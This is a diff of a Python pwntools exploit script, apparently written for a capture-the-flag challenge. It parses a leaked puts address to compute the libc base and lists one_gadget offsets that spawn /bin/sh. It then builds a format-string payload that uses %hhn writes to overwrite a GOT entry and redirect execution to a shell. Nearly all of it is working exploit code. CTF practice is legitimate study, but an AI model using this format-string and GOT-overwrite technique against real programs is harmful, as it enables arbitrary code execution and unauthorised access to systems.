@@ -21,25 +21,62 @@ else:
 #     p.recvuntil(b'Guess the movement KunKun will do:(c/t/r/l)\n')
 #     p.sendline(new_s[i].encode())
 p.send(new_s.encode())
-p.recvuntil(b'> ')
+p.recvuntil(b'A gift for you. The puts addr is: ')
+puts_addr=p.recv(6)
+#字符串转地址
+puts_addr=binascii.hexlify(puts_addr[::-1])
+print("puts_addr",puts_addr)
+libcbase=int(puts_addr,16)-libc.sym['puts']
+print("libcbase",hex(libcbase))
 # p.interactive()
+# 0x45226 execve("/bin/sh", rsp+0x30, environ)
+# constraints:
+#   rax == NULL
 
-backdoor=0x000000000400951
-print('backdoor',hex(backdoor))
-print(backdoor%256,backdoor//256%256)
-one=backdoor%256
-two=backdoor//256%256-one
-three=backdoor//256//256%256-one-two
+# 0x4527a execve("/bin/sh", rsp+0x30, environ)
+# constraints:
+#   [rsp+0x30] == NULL
+
+# 0xf03a4 execve("/bin/sh", rsp+0x50, environ)
+# constraints:
+#   [rsp+0x50] == NULL
+
+# 0xf1247 execve("/bin/sh", rsp+0x70, environ)
+# constraints:
+#   [rsp+0x70] == NULL
+
+
+# 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
+# constraints:
+#   rsp & 0xf == 0
+#   rcx == NULL
+
+# 0x4f322 execve("/bin/sh", rsp+0x40, environ)
+# constraints:
+#   [rsp+0x40] == NULL
+
+# 0x10a38c execve("/bin/sh", rsp+0x70, environ)
+# constraints:
+#   [rsp+0x70] == NULL
+
+
+one_gadget=libcbase+0x10a38c
+print('one_gadget',hex(one_gadget))
+print(one_gadget%256,one_gadget//256%256)
+one=one_gadget%256
+two=one_gadget//256%256-one
+three=one_gadget//256//256%256-one-two
 if two<0:
     two=256+two
 if three<0:
     three=256+three
 print(one,two,three)
+p.recvuntil(b'say something for our KunKun!\n')
 # di12个参数
 # system_got=0x602028
 # payload=(b'%'+bytes(str(one), encoding='utf-8')+b'c%17$hhn%'+bytes(str(two), encoding='utf-8')+b'c%18$hhn%'+bytes(str(three), encoding='utf-8')+b'c%21$hhn%').ljust(40,b'k')+p64(system_got)+p64(system_got+1)+p64(0)+p64(0)+p64(system_got+2)
-exit_got=0x602070
-payload=(b'%'+bytes(str(one), encoding='utf-8')+b'c%17$hhn%'+bytes(str(two), encoding='utf-8')+b'c%18$hhn%'+bytes(str(three), encoding='utf-8')+b'c%21$hhn%').ljust(40,b'k')+p64(exit_got)+p64(exit_got+1)+p64(0)+p64(0)+p64(exit_got+2)
+system_got=0x602028
+payload=(b'%'+bytes(str(one), encoding='utf-8')+b'c%17$hhn%'+bytes(str(two), encoding='utf-8')+b'c%18$hhn%'+bytes(str(three), encoding='utf-8')+b'c%21$hhn%').ljust(40,b'k')+p64(system_got)+p64(system_got+1)+p64(0)+p64(0)+p64(system_got+2)
 
 # payload=(b'%'+bytes(str(one), encoding='utf-8')+b'c%15$hhn%').rjust(24,b'k')+p64(system_got)
 print('payload',payload)
